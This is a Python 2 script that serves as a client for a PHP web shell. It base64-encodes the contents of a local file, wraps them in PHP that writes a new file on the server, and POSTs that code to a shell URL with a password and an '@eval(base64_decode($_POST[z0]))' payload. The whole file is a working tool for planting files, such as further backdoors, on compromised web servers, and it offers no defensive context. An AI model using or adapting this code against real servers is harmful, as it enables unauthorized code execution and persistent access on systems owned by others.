#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import base64
import re,httplib
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)

def url_post(url,PASS,data):
    try:
        params="""=@eval(base64_decode($_POST[z0]));&z0=%s"""%(data)
        print params
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()

            print data

        except Exception,e:
            print e
            return 0

    except Exception,e:
        print e
        return 0

def base64_jm(name,data):
    try:
        mm=base64.b64encode(data)
        #data="""$file ="%s";$data ="%s";file_put_contents($file,$data);"""%(name,data)
        #data="""file_put_contents("%s","%s");"""%(name,mm)
        data="""
        $Code = '%s';
        $File = '%s';
        $Temp = base64_decode($Code);
        file_put_contents($File,$Temp);
        echo "OK11111！";"""%\
             (mm,name)    #file_put_contents($File,$Temp);   $data=urldecode($Temp);
        #print data
        return base64.b64encode(data)   #加密
    except Exception,e:
        print e
        return 0

if __name__ == "__main__":
    data=""
    xxx = file('add.php', 'r')
    for xxx_line in xxx.readlines():
        data+=xxx_line+"\r\n"

    #print data
    abc=base64_jm("sssssss.php",data)

    url_post("http://127.0.0.1:8888/1.php","long",abc)










